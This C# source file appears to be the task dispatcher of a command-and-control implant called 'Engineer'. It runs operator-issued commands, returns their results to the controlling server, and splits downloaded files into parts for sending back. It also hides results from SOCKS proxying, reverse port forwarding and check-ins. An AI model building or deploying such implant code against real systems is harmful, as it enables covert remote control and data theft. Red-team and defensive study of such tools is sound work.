using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Functions
{
    internal class Tasking
    {
        public static Dictionary<string, EngineerTaskResult> engTaskResultDic = new(); // key is the task id and value is the whole task
        public static Dictionary<string, EngineerTask> engTaskDic = new(); // key is the task id and value is the whole task

        public static void DealWithTasks(IEnumerable<EngineerTask> tasks)
        {
            foreach (var task in tasks)
            {
                //if task.IsBlocking is true then we need to wait for the task to finish before we can continue
                if (task.IsBlocking)
                {
                    // Console.WriteLine("Blocking task executing");
                    DealWithTask(task);
                }
                else
                {
                    //if task.IsBlocking is false then we can just start the task and continue
                    Task.Run(async () => await DealWithTask(task));
                }
            }
        }

        public static async Task DealWithTask(EngineerTask task)
        {
            try
            {
                //add task to engTaskDic
                engTaskDic.Add(task.Id, task);

                //make an EngineerTaskResult 
                var taskResult = new EngineerTaskResult
                {
                    Id = task.Id,
                    Command = task.Command,
                    Result = "",
                    IsHidden = false,
                    Status = EngTaskStatus.Running,
                    EngineerId = Program._metadata.Id
                };

                var command = Program._commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.CurrentCultureIgnoreCase)); //this should then take input and match too cmd list
                if (command is null)
                {
                    var result = "Error: Command not found";
                    taskResult.Result = result;
                    taskResult.Command = task.Command;
                    taskResult.Status = EngTaskStatus.Failed;
                    Program.SendTaskResult(taskResult);
                    //Program.SendTaskResult(task.Id, result, false, EngTaskStatus.Failed);  //task we send in still has all properties including Id
                }
                else
                {
                    AddTaskResult(taskResult);
                    var result = command.Execute(task);

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }  
        }

        public static void AddTaskResult(EngineerTaskResult taskResult)
        {
            if (!engTaskResultDic.ContainsKey(taskResult.Id))
            { 
                engTaskResultDic.Add(taskResult.Id, taskResult);
            }
        }

        public static void FillTaskResults(string output, EngineerTask task,EngTaskStatus taskStatus)
        {
            if (engTaskResultDic.ContainsKey(task.Id))
            {
                engTaskResultDic[task.Id].Result = output;
                engTaskResultDic[task.Id].Status = taskStatus;
            }
            //if command is download then call the Functions.DownloadTracker.SplitFileString function, get the filename from the task.Arguments, and pass the result to the function
            if (task.Command.Equals("download", StringComparison.CurrentCultureIgnoreCase))
            {
                if (engTaskResultDic[task.Id].Status == EngTaskStatus.Complete)
                {
                    task.Arguments.TryGetValue("/file", out string filename);
                    Functions.DownloadTracker.SplitFileString(filename, engTaskResultDic[task.Id].Result);
                    //send each value from the key that matches the filename variable in _downloadedFileParts to the server
                    foreach (var value in Functions.DownloadTracker._downloadedFileParts[filename])
                    {
                        engTaskResultDic[task.Id].Result = value;
                        Program.SendTaskResult(engTaskResultDic[task.Id]);
                    }
                }
                else
                {
                    Program.SendTaskResult(engTaskResultDic[task.Id]);
                }
            }
            //if Command name is ConnectSocks, SendSocks, ReceiveSocks send a true for ishidden
            else if (task.Command.Equals("socksConnect", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("socksSend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("socksReceive", StringComparison.CurrentCultureIgnoreCase))
            {
                engTaskResultDic[task.Id].IsHidden = true;
                Program.SendTaskResult(engTaskResultDic[task.Id]);
            }
            else if (task.Command.Equals("FirstCheckIn", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine($"first check in task {task.Id} complete");
                engTaskResultDic[task.Id].IsHidden = true;
                Program.SendTaskResult(engTaskResultDic[task.Id]);
                //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
            }
            else if (task.Command.Equals("CheckIn", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine($" check in task {task.Id} complete");
                engTaskResultDic[task.Id].IsHidden = true;
                Program.SendTaskResult(engTaskResultDic[task.Id]);
                //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
            }
            else if (task.Command.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportRecieve", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportforward", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine($"task {task.Id} complete");
                engTaskResultDic[task.Id].IsHidden = true;
                Program.SendTaskResult(engTaskResultDic[task.Id]);
                //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
            }
            else if(task.Command.Equals("canceltask",StringComparison.CurrentCultureIgnoreCase))
            {
                engTaskResultDic[task.Id].IsHidden = true;
                Program.SendTaskResult(engTaskResultDic[task.Id]);
            }
            else
            {
                //Console.WriteLine($"{DateTime.Now} task {task.Id} complete");
                Program.SendTaskResult(engTaskResultDic[task.Id]);
                //Program.SendTaskResult(task.Id, result, false, EngTaskStatus.Complete);
            }

            if(engTaskResultDic[task.Id].Status == EngTaskStatus.Complete)
            {
                //we remove once complete because we dont want this building up and using tons of memory
                engTaskResultDic.Remove(task.Id);
            }
        }
        
    }
}
